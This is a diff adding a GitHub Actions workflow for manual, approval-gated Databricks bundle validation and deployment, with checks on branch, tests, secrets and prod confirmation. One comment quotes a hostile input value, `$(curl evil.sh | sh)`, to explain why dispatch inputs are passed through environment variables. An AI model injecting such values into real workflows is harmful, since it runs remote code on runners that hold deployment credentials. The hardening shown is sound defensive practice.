@@ -1,0 +1,158 @@
+name: CD Deploy
+
+# Issue #133: deployment as a repository-level action requiring explicit
+# approval, not a manual `databricks bundle deploy` run from someone's
+# laptop. Manual dispatch only -- there is no branch push or schedule
+# trigger here on purpose, since a deploy should always be a deliberate,
+# visible action, not a side effect of merging.
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: "Databricks bundle target to validate (and optionally deploy)."
+        required: true
+        type: choice
+        options:
+          - dev
+          - prod
+        default: dev
+      deploy:
+        description: "Actually deploy after validating? Leave unchecked to validate only (the default)."
+        required: true
+        type: boolean
+        default: false
+      confirm:
+        description: "Deploying to prod only: type prod here to confirm."
+        required: false
+        type: string
+
+permissions:
+  contents: read
+
+# A second dispatch for the same target queues behind the first instead of
+# running alongside it or cancelling it -- two overlapping deploys to the
+# same workspace is exactly what this workflow exists to prevent.
+concurrency:
+  group: cd-deploy-${{ inputs.target }}
+  cancel-in-progress: false
+
+jobs:
+  cd:
+    name: Validate and deploy (${{ inputs.target }})
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+
+    # This is the actual approval gate: a job's `environment` is what makes
+    # GitHub hold the job for required reviewers, and it's also the only
+    # place DATABRICKS_HOST / DATABRICKS_TOKEN become visible, since those
+    # are environment secrets, not repository secrets (see docs/deployment.md
+    # -- Team Requirements). Both apply to every run, including a
+    # validate-only one: `databricks bundle validate` still calls the live
+    # workspace API, so it needs the same credentials and the same gate as an
+    # actual deploy. What "validation-only by default" buys you is that a
+    # reviewer can approve a run and know the deploy step itself is still
+    # skipped unless `deploy` was explicitly checked.
+    #
+    # This environment must exist in the repo's Settings -> Environments
+    # with required reviewers configured, or GitHub silently auto-creates it
+    # with NO protection rules the first time this reference runs, and the
+    # approval gate becomes a no-op. Setup instructions: docs/deployment.md.
+    environment: ${{ inputs.target }}
+
+    steps:
+      # Prod only ever runs reviewed code: main. Dev can deploy any branch,
+      # which is what dev is for. Checked before anything else, so a prod
+      # dispatch from a feature branch fails in seconds instead of after the
+      # tests. The prod environment's "Deployment branches" rule enforces
+      # the same thing on GitHub's side (docs/deployment.md); this makes the
+      # failure explain itself.
+      - name: Prod deploys only from main
+        if: inputs.target == 'prod'
+        env:
+          DISPATCH_REF: ${{ github.ref }}
+        run: |
+          if [ "$DISPATCH_REF" != "refs/heads/main" ]; then
+            echo "::error::prod can only be deployed from main. This run was dispatched from '$DISPATCH_REF'. Re-run it with 'Use workflow from: main'."
+            exit 1
+          fi
+
+      - uses: actions/checkout@v6
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+
+      - name: Install test dependencies
+        run: python -m pip install -r requirements-dev.txt
+
+      # Re-run the test suite here, not just trust that CI was green on this
+      # commit -- a deploy can be dispatched from any ref, including one CI
+      # never saw.
+      - name: Run tests before touching anything in Databricks
+        run: python -m pytest tests -q
+
+      - name: Check DATABRICKS_HOST and DATABRICKS_TOKEN are configured
+        env:
+          DATABRICKS_HOST: ${{ secrets.DATABRICKS_HOST }}
+          DATABRICKS_TOKEN: ${{ secrets.DATABRICKS_TOKEN }}
+        run: |
+          missing=0
+          if [ -z "$DATABRICKS_HOST" ]; then
+            echo "::error::DATABRICKS_HOST is not set. Add it as a secret on the '${{ inputs.target }}' environment (Settings -> Environments -> ${{ inputs.target }} -> Environment secrets)."
+            missing=1
+          fi
+          if [ -z "$DATABRICKS_TOKEN" ]; then
+            echo "::error::DATABRICKS_TOKEN is not set. Add it as a secret on the '${{ inputs.target }}' environment (Settings -> Environments -> ${{ inputs.target }} -> Environment secrets). It must be a service principal token, not a personal one -- see docs/deployment.md."
+            missing=1
+          fi
+          if [ "$missing" = "1" ]; then
+            exit 1
+          fi
+          echo "Both secrets are present for the '${{ inputs.target }}' environment."
+
+      - uses: databricks/setup-cli@main
+
+      # Inputs go through env: rather than being interpolated directly into
+      # the run: script. A workflow_dispatch input is attacker-controlled
+      # text as far as the shell is concerned, and interpolating it straight
+      # into a run: block (e.g. `if [ "${{ inputs.x }}" != ... ]`) lets a
+      # value like `$(curl evil.sh | sh)` execute on the runner. Reading it
+      # back from an env var sidesteps that entirely, since the shell never
+      # re-parses the value as script text.
+      - name: Validate the bundle against ${{ inputs.target }}
+        env:
+          DATABRICKS_HOST: ${{ secrets.DATABRICKS_HOST }}
+          DATABRICKS_TOKEN: ${{ secrets.DATABRICKS_TOKEN }}
+          BUNDLE_TARGET: ${{ inputs.target }}
+        run: databricks bundle validate --target "$BUNDLE_TARGET"
+
+      # Extra confirmation for prod specifically, on top of the environment
+      # approval: the reviewer approving the job and the person who typed
+      # `deploy: true` are (on a student team) often the same person acting
+      # quickly, so this catches "meant to pick dev, picked prod" rather than
+      # relying on the approval step alone to catch it.
+      - name: Confirm the target name before a prod deploy
+        if: inputs.deploy == true && inputs.target == 'prod'
+        env:
+          CONFIRM_INPUT: ${{ inputs.confirm }}
+          EXPECTED_TARGET: ${{ inputs.target }}
+        run: |
+          if [ "$CONFIRM_INPUT" != "$EXPECTED_TARGET" ]; then
+            echo "::error::To deploy to prod, type 'prod' (without quotes) in the confirm field. Got: '$CONFIRM_INPUT'."
+            exit 1
+          fi
+          echo "Confirmed: deploying to $EXPECTED_TARGET."
+
+      - name: Deploy the bundle to ${{ inputs.target }}
+        if: inputs.deploy == true
+        env:
+          DATABRICKS_HOST: ${{ secrets.DATABRICKS_HOST }}
+          DATABRICKS_TOKEN: ${{ secrets.DATABRICKS_TOKEN }}
+          BUNDLE_TARGET: ${{ inputs.target }}
+        run: databricks bundle deploy --target "$BUNDLE_TARGET"
+
+      - name: Validation-only run -- no deploy performed
+        if: inputs.deploy == false
+        run: |
+          echo "deploy=false, so only 'databricks bundle validate' ran above against '${{ inputs.target }}'. Nothing was deployed."
+          echo "To deploy for real, re-run this workflow with deploy=true (and confirm='prod' if target is prod)."
